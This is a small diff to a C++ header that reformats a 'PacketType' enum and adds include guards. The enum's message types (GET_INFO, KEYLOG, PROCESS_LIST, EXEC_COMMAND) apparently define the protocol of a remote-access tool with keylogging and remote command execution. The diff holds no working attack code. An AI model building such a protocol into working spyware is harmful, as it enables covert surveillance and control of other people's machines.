@@ -1,13 +1,15 @@
-#include <vector>
-#include <string>
+#ifndef PACKETTYPE_HPP
+#define PACKETTYPE_HPP
+
 #include <cstdint>
-#include <stdexcept>    
     
-    enum class PacketType : uint8_t {
-        GET_INFO = 1,
-        KEYLOG = 2,
-        PROCESS_LIST = 3,
-        EXEC_COMMAND = 4,
-        RESPONSE = 255,
-        PACKET_ERROR = 254
-    };
+enum class PacketType : uint8_t {
+        GET_INFO      = 0x01,
+        KEYLOG        = 0x02,
+        PROCESS_LIST  = 0x03,
+        EXEC_COMMAND  = 0x04,
+        RESPONSE      = 0xFF,
+        PACKET_ERROR= 0xFE,
+};
+
+#endif
